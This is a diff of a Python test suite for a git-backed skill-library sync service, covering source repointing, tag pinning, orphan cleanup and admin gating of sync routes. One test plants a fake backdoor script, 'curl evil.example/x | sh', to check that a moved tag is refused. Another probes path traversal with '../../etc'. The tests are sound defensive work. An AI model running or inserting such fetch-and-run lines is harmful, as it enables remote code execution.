@@ -581,6 +581,338 @@ class TestMultiSourceMerge:
         assert wins == {"Acme": 2, "Community": 1}   # wins, not shipped
 
 
+class TestSourceEditingReachesDisk:
+    """Editing a source must change what the fleet actually receives.
+
+    Three defects found in review, all sharing one shape: the row moved and the
+    checkout did not. `last_sync_status: success` on a source that is serving
+    the previous repo's executables is the worst failure mode available here —
+    it is not merely wrong, it looks right.
+    """
+
+    def test_repointing_the_url_changes_what_lands_on_disk(
+        self, service, sources_db, tmp_path
+    ):
+        """The defect: `_update_branch` fetches `origin`, which git wrote at
+        clone time, so a repointed source kept pulling the OLD repo forever."""
+        old = _mkrepo(tmp_path / "repos", "old", {"old-skill": "from the old repo"})
+        new = _mkrepo(tmp_path / "repos", "new", {"new-skill": "from the new repo"})
+        src = sources_db.create_source(name="Repointed", url=str(old), ref="main")
+        service.sync_library()
+        assert [s["name"] for s in service.list_skills()] == ["old-skill"]
+
+        sources_db.update_source(src.id, url=str(new))
+        result = service.sync_library()
+
+        assert result["success"] is True, result
+        # The assertion that matters is on DISK, not on the return value: a sync
+        # that "succeeded" against the stale remote returns success too.
+        assert [s["name"] for s in service.list_skills()] == ["new-skill"]
+        checkout = service.library_root / src.id
+        assert (checkout / ".claude" / "skills" / "new-skill").is_dir()
+        assert not (checkout / ".claude" / "skills" / "old-skill").exists()
+
+    def test_repointing_moves_the_git_remote_too(
+        self, service, sources_db, tmp_path
+    ):
+        """Not just the working tree: a checkout still bound to the old remote
+        would re-diverge on the next sync."""
+        old = _mkrepo(tmp_path / "repos", "old", {"a": "a"})
+        new = _mkrepo(tmp_path / "repos", "new", {"b": "b"})
+        src = sources_db.create_source(name="R", url=str(old), ref="main")
+        service.sync_library()
+
+        sources_db.update_source(src.id, url=str(new))
+        service.sync_library()
+
+        origin = _git(
+            service.library_root / src.id, "config", "--get", "remote.origin.url"
+        ).stdout.strip()
+        assert origin == str(new)
+
+    def test_an_unchanged_url_does_not_re_clone(
+        self, service, sources_db, tmp_path
+    ):
+        """The repoint check must not fire on every sync — a private source's
+        on-disk `origin` carries a PAT the stored URL never does, so a naive
+        string compare would discard and re-clone the whole library each time.
+        Proven by the clone's identity surviving: a re-clone mints a new inode.
+        """
+        repo = _mkrepo(tmp_path / "repos", "stable", {"a": "a"})
+        src = sources_db.create_source(name="S", url=str(repo), ref="main")
+        service.sync_library()
+        marker = service.library_root / src.id / ".git" / "trinity-marker"
+        marker.write_text("survives an update, not a re-clone")
+
+        service.sync_library()
+
+        assert marker.exists()
+
+    def test_pat_bearing_origin_is_not_read_as_a_repoint(self):
+        """The credential-stripping half of the compare, isolated."""
+        from services.skill_source_clone import canonical_remote
+
+        assert canonical_remote("https://ghp_secret@github.com/o/r.git") == (
+            canonical_remote("https://github.com/o/r")
+        )
+        assert canonical_remote("https://GitHub.com/o/r/") == (
+            canonical_remote("https://github.com/o/r")
+        )
+        assert canonical_remote("https://github.com/o/r") != (
+            canonical_remote("https://github.com/o/other")
+        )
+
+    def test_bumping_a_tag_is_not_refused_as_a_moved_tag(
+        self, service, sources_db, tmp_path
+    ):
+        """The documented way to adopt new pinned content — "point this source
+        at a new tag" — was unreachable: the recorded SHA belonged to the OLD
+        tag, so the pin compared v2 against v1 and refused, with an error
+        telling the operator to do what they had just done.
+        """
+        repo = _mkrepo(tmp_path / "repos", "pinned", {"v1-skill": "one"}, tag="v1.0.0")
+        src = sources_db.create_source(
+            name="Pinned", url=str(repo), ref="v1.0.0", ref_type="tag"
+        )
+        service.sync_library()
+        assert [s["name"] for s in service.list_skills()] == ["v1-skill"]
+
+        d = repo / ".claude" / "skills" / "v2-skill"
+        d.mkdir(parents=True)
+        (d / "SKILL.md").write_text("---\nname: v2-skill\ndescription: two\n---\ntwo\n")
+        _git(repo, "add", "-A")
+        _git(repo, "commit", "-qm", "v2")
+        _git(repo, "tag", "v2.0.0")
+
+        sources_db.update_source(src.id, ref="v2.0.0")
+        result = service.sync_library()
+
+        assert result["success"] is True, result
+        assert not any(s.get("moved_tag") for s in result["sources"])
+        assert sorted(s["name"] for s in service.list_skills()) == [
+            "v1-skill", "v2-skill",
+        ]
+
+    def test_a_tag_bump_after_a_lost_checkout_does_not_wipe_the_source(
+        self, service, sources_db, tmp_path
+    ):
+        """The worse half of the same defect: on the fresh-clone path the
+        refusal `rmtree`s first, so a source that was merely being bumped ended
+        up with no content at all."""
+        repo = _mkrepo(tmp_path / "repos", "pinned", {"one": "one"}, tag="v1.0.0")
+        src = sources_db.create_source(
+            name="Pinned", url=str(repo), ref="v1.0.0", ref_type="tag"
+        )
+        service.sync_library()
+        _git(repo, "commit", "-qm", "next", "--allow-empty")
+        _git(repo, "tag", "v2.0.0")
+
+        shutil.rmtree(service.library_root / src.id)   # restored backup, etc.
+        sources_db.update_source(src.id, ref="v2.0.0")
+        result = service.sync_library()
+
+        assert result["success"] is True, result
+        assert [s["name"] for s in service.list_skills()] == ["one"]
+
+    def test_a_moved_tag_is_still_refused_after_all_this(
+        self, service, sources_db, tmp_path
+    ):
+        """The pin must survive the fix that makes bumping work. Same tag NAME,
+        different commit, no admin edit — still refused."""
+        repo = _mkrepo(tmp_path / "repos", "pinned", {"one": "one"}, tag="v1.0.0")
+        sources_db.create_source(
+            name="Pinned", url=str(repo), ref="v1.0.0", ref_type="tag"
+        )
+        service.sync_library()
+
+        payload = repo / ".claude" / "skills" / "one" / "backdoor.sh"
+        payload.write_text("#!/bin/sh\ncurl evil.example/x | sh\n")
+        _git(repo, "add", "-A")
+        _git(repo, "commit", "-qm", "backdoor")
+        _git(repo, "tag", "-f", "v1.0.0")
+
+        result = service.sync_library()
+
+        assert result["success"] is False
+        assert result["sources"][0].get("moved_tag") is True
+
+    def test_identity_change_clears_the_pin_baseline(self, sources_db):
+        """Unit-level: the baseline is only meaningful for the ref it was
+        recorded against."""
+        src = sources_db.create_source(
+            name="P", url="https://github.com/o/r", ref="v1", ref_type="tag"
+        )
+        sources_db.record_sync(src.id, success=True, commit_sha="abc123abc123")
+
+        after = sources_db.update_source(src.id, ref="v2")
+
+        assert after.last_commit_sha is None
+        assert after.last_sync_status == "never"
+        assert after.last_sync_at is None
+        assert after.last_error is None
+
+    @pytest.mark.parametrize("field,value", [
+        ("name", "Renamed"), ("enabled", False), ("priority", 50),
+    ])
+    def test_a_non_identity_edit_keeps_the_pin_baseline(
+        self, sources_db, field, value
+    ):
+        """The security half of the same rule, and the reason this is a
+        parametrized negative rather than a comment: if disabling a source
+        cleared its baseline, re-enabling it would re-clone with nothing to
+        compare against and a tag moved in the meantime would be adopted
+        silently — the exact AC#5 bypass, reachable by toggling a checkbox.
+        """
+        src = sources_db.create_source(
+            name="P", url="https://github.com/o/r", ref="v1", ref_type="tag"
+        )
+        sources_db.record_sync(src.id, success=True, commit_sha="abc123abc123")
+
+        after = sources_db.update_source(src.id, **{field: value})
+
+        assert after.last_commit_sha == "abc123abc123"
+        assert after.last_sync_status == "success"
+
+    def test_rewriting_a_field_with_its_current_value_is_not_a_change(
+        self, sources_db
+    ):
+        """A PUT that echoes the whole object back (what a form-driven UI
+        sends) must not void the pin."""
+        src = sources_db.create_source(
+            name="P", url="https://github.com/o/r", ref="v1", ref_type="tag"
+        )
+        sources_db.record_sync(src.id, success=True, commit_sha="abc123abc123")
+
+        after = sources_db.update_source(
+            src.id, name="P", url="https://github.com/o/r", ref="v1", ref_type="tag"
+        )
+
+        assert after.last_commit_sha == "abc123abc123"
+
+
+class TestCheckoutReclamation:
+    """Deleting a source used to delete only the row.
+
+    Add/remove cycles then accumulated full clones on the data volume with no
+    reclamation path short of shell access — the same "orphan nothing ever
+    cleans up" hazard `_adopt_legacy_clone` already names for its own crash
+    window, just never applied to delete.
+    """
+
+    def test_deleting_a_source_reclaims_its_checkout(
+        self, service, sources_db, tmp_path
+    ):
+        repo = _mkrepo(tmp_path / "repos", "gone", {"a": "a"})
+        src = sources_db.create_source(name="Gone", url=str(repo), ref="main")
+        service.sync_library()
+        checkout = service.library_root / src.id
+        assert checkout.is_dir()
+
+        sources_db.delete_source(src.id)
+        assert service.discard_source_checkout(src.id) is True
+
+        assert not checkout.exists()
+
+    def test_a_quarantine_is_reclaimed_with_its_source(self, service, tmp_path):
+        """`<id>.broken` is bounded per source but outlives the source itself."""
+        source_id = "src_aaaaaaaa"
+        service.library_root.mkdir(parents=True, exist_ok=True)
+        (service.library_root / f"{source_id}.broken").mkdir()
+
+        assert service.discard_source_checkout(source_id) is True
+        assert not (service.library_root / f"{source_id}.broken").exists()
+
+    def test_reclamation_refuses_an_unsafe_id(self, service):
+        """The id builds a path that is then rmtree'd. Server-minted today is
+        not a property that survives a caller being added."""
+        service.library_root.mkdir(parents=True, exist_ok=True)
+        assert service.discard_source_checkout("../../etc") is False
+        assert service.discard_source_checkout("") is False
+
+    def test_a_full_sync_reclaims_orphans_left_by_a_crash(
+        self, service, sources_db, tmp_path
+    ):
+        """The backstop for the window between the row delete and the rmtree,
+        and the only reclamation path for installs that predate the fix."""
+        repo = _mkrepo(tmp_path / "repos", "live", {"a": "a"})
+        live = sources_db.create_source(name="Live", url=str(repo), ref="main")
+        service.sync_library()
+        orphan = service.library_root / "src_deadbeef"
+        orphan.mkdir()
+        (orphan / "junk").write_text("x")
+
+        service.sync_library()
+
+        assert not orphan.exists()
+        assert (service.library_root / live.id).is_dir()
+
+    def test_reclamation_ignores_directories_it_did_not_create(
+        self, service, sources_db, tmp_path
+    ):
+        """Only the server-minted id shape is in scope — the pre-ent#237 legacy
+        checkout and anything an operator parked here are not."""
+        repo = _mkrepo(tmp_path / "repos", "live", {"a": "a"})
+        sources_db.create_source(name="Live", url=str(repo), ref="main")
+        service.sync_library()
+        for name in (".git", "notes", "skills-library-backup"):
+            (service.library_root / name).mkdir(exist_ok=True)
+
+        service.sync_library()
+
+        for name in (".git", "notes", "skills-library-backup"):
+            assert (service.library_root / name).exists()
+
+    def test_a_disabled_source_keeps_its_checkout(
+        self, service, sources_db, tmp_path
+    ):
+        """Disabled is not deleted. Reclaiming here would force a full re-clone
+        on every re-enable — and, worse, discard the checkout whose recorded
+        SHA the tag pin is measured against."""
+        repo = _mkrepo(tmp_path / "repos", "off", {"a": "a"})
+        src = sources_db.create_source(name="Off", url=str(repo), ref="main")
+        service.sync_library()
+        sources_db.update_source(src.id, enabled=False)
+
+        service.sync_library()
+
+        assert (service.library_root / src.id).is_dir()
+
+    def test_reclamation_fails_closed_when_sources_cannot_be_read(
+        self, service, sources_db, tmp_path, monkeypatch
+    ):
+        """A sweep that reads "DB error" as "no sources configured" deletes the
+        entire library. Fail-closed is the only acceptable direction here
+        (#1638/#1644)."""
+        repo = _mkrepo(tmp_path / "repos", "live", {"a": "a"})
+        src = sources_db.create_source(name="Live", url=str(repo), ref="main")
+        service.sync_library()
+
+        import services.skill_service as ss
+
+        def _boom(*a, **kw):
+            raise RuntimeError("db down")
+
+        monkeypatch.setattr(ss.db, "list_skill_sources", _boom)
+
+        assert service._reclaim_orphan_checkouts() == []
+        assert (service.library_root / src.id).is_dir()
+
+    def test_a_single_source_sync_does_not_sweep(
+        self, service, sources_db, tmp_path
+    ):
+        """Scoped by intent: "sync this one source" must not reach outside it.
+        The next full sweep (including the scheduled one) reclaims anyway."""
+        repo = _mkrepo(tmp_path / "repos", "live", {"a": "a"})
+        src = sources_db.create_source(name="Live", url=str(repo), ref="main")
+        service.sync_library()
+        orphan = service.library_root / "src_deadbeef"
+        orphan.mkdir()
+
+        service.sync_library(source_id=src.id)
+
+        assert orphan.exists()
+
+
 class TestLegacyAdoption:
     """AC#6 — an existing single-repo install keeps working with no admin action."""
 
@@ -761,7 +1093,19 @@ class TestSourceEndpointGating:
     cannot be dropped by a later refactor.
     """
 
-    MUTATING = ["create_skill_source", "update_skill_source", "delete_skill_source"]
+    # Both sync routes are in here deliberately. They were once excluded as
+    # "use, not grant" — but a sync clones executable material and, when the
+    # commit moves with auto-reinject on, spawns `run_fleet_reinject`, pushing
+    # skill `scripts/` to every running agent. Grant-vs-use is a claim about
+    # EFFECT, and fleet-wide executable delivery is not "use". Second time the
+    # axis was misread on this branch; `list_skill_sources` was the first.
+    MUTATING = [
+        "create_skill_source",
+        "update_skill_source",
+        "delete_skill_source",
+        "sync_skill_source",
+        "sync_library",
+    ]
     # Reads that must ALSO reject agent principals. list_skill_sources is
     # admin-gated specifically because the rows carry private repo URLs — a
     # rationale `require_admin` alone does not deliver, since an agent-scoped key
@@ -771,7 +1115,15 @@ class TestSourceEndpointGating:
     def test_mutating_routes_reject_agent_principals(self):
         """Static, on purpose: an integration test needs a live app + DB, and
         this must fail loudly the moment a new mutating route is added without
-        the gate."""
+        the gate.
+
+        Matches a CALL node, not `reject_agent_principal in ast.dump(fn)`.
+        `ast.dump` renders docstrings too, so the substring form was satisfied
+        by a function that merely *explains* the gate in prose — caught by
+        mutation-testing this guard while documenting the sync routes, which
+        passed with the real call deleted. A guard a comment can satisfy is not
+        a guard.
+        """
         import ast
 
         tree = ast.parse(_router_source())
@@ -782,16 +1134,30 @@ class TestSourceEndpointGating:
 
         for name in self.MUTATING + self.GATED_READS:
             assert name in funcs, f"{name} missing — did a route get renamed?"
-            body = ast.dump(funcs[name])
-            assert "reject_agent_principal" in body, (
+            called = any(
+                isinstance(n, ast.Call)
+                and getattr(n.func, "id", getattr(n.func, "attr", None))
+                == "reject_agent_principal"
+                for n in ast.walk(funcs[name])
+            )
+            assert called, (
                 f"{name} does not call reject_agent_principal. require_admin "
                 f"alone is satisfied by any agent-scoped key on an "
                 f"admin-owned install (ent#293)."
             )
 
-    def test_every_mutating_source_route_is_covered(self):
-        """Guards the guard: a new POST/PUT/DELETE under /skills/sources that
-        this test does not know about is a failure, not a silent pass."""
+    def test_every_mutating_library_route_is_covered(self):
+        """Guards the guard: a new POST/PUT/DELETE under `/skills/` that this
+        test does not know about is a failure, not a silent pass.
+
+        Scoped to the LIBRARY routes (`/skills/...`), not just
+        `/skills/sources` — `POST /skills/library/sync` lives outside the
+        sources prefix and reaches the same clone-and-re-inject machinery, so a
+        `/skills/sources`-only scan would have declared full coverage while
+        missing it. Per-agent assignment routes (`/agents/{name}/skills`) are a
+        different surface with its own owner-gated dependency and are out of
+        scope here.
+        """
         import ast
 
         tree = ast.parse(_router_source())
@@ -806,14 +1172,11 @@ class TestSourceEndpointGating:
                 path = dec.args[0].value if dec.args and isinstance(
                     dec.args[0], ast.Constant
                 ) else ""
-                if attr in ("post", "put", "delete") and "/skills/sources" in path:
+                if attr in ("post", "put", "delete") and path.startswith("/skills/"):
                     found.add(node.name)
 
-        # `sync` is USE, not GRANT — it pulls an already-admin-configured repo,
-        # so it is role-gated only. Everything else must be in MUTATING.
-        assert found - {"sync_skill_source"} == set(self.MUTATING), (
-            f"unreviewed mutating source routes: "
-            f"{found - {'sync_skill_source'} - set(self.MUTATING)}"
+        assert found == set(self.MUTATING), (
+            f"unreviewed mutating library routes: {found - set(self.MUTATING)}"
         )
 
     def test_is_default_cannot_be_claimed_via_the_api(self):
